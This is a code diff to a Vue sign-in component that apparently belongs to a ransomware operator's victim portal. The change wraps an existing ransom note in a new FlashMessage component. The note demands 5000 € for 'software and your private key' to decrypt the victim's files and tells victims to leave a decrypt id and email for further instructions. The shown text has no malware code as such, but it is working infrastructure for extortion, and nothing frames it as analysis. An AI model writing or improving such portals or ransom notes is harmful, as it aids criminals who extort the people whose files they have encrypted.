@@ -16,13 +16,17 @@
                 </div>
             </form>
             <div class="title title--caption">
-                <h2 class=" flash flash--danger title-label medium">
-                    Attention ! <br/>
-                    Price of software and your private key is <strong>5000 €</strong>. With this product you can decrypt all your files, if your are willing to pay for a software product, then: <br/><br/>
-                    Deer user, <br/>
-                    Leave your decrypt id and email. We will contact you within twenty four hours and give further instructions. <br/>
-                    You do not need to leave different electronic addresses or the same address many time
-                </h2>
+                <FlashMessage
+                    type="error"
+                >
+                    <h2 class="title-label medium">
+                        Attention ! <br/>
+                        Price of software and your private key is <strong>5000 €</strong>. With this product you can decrypt all your files, if your are willing to pay for a software product, then: <br/><br/>
+                        Deer user, <br/>
+                        Leave your decrypt id and email. We will contact you within twenty four hours and give further instructions. <br/>
+                        You do not need to leave different electronic addresses or the same address many time
+                    </h2>
+                </FlashMessage>
             </div>
         </div>
     </div>
@@ -31,9 +35,11 @@
 <script lang="ts">
 import { defineComponent } from 'vue';
 import HttpRequest from "../core/services/http/HttpRequest";
+import FlashMessage from "../components/FlashMessage.vue";
 
 export default defineComponent({
     name: 'Signin',
+    components: {FlashMessage},
     data() {
         return {
             user: {
